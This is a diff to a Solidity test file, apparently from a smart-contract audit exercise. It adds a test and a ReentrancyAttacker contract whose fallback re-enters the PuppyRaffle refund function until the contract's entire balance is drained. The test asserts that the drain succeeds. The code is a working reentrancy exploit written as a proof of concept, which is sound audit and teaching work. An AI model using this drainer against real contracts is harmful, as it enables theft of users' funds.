@@ -248,8 +248,46 @@ contract PuppyRaffleTest is Test {
         assert(gasUsedFirst < gasUsedSecond);
         }
 
+        
+    function testReentrance() public playersEntered {
+        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
+        vm.deal(address(attacker), 1e18);
+        uint256 startingAttackerBalance = address(attacker).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
 
+        attacker.attack();
+
+        uint256 endingAttackerBalance = address(attacker).balance;
+        uint256 endingContractBalance = address(puppyRaffle).balance;
+        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
+        assertEq(endingContractBalance, 0);
+}
 }
 
 
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
 
+    constructor(address _puppyRaffle) {
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    fallback() external payable {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+}
+
+   
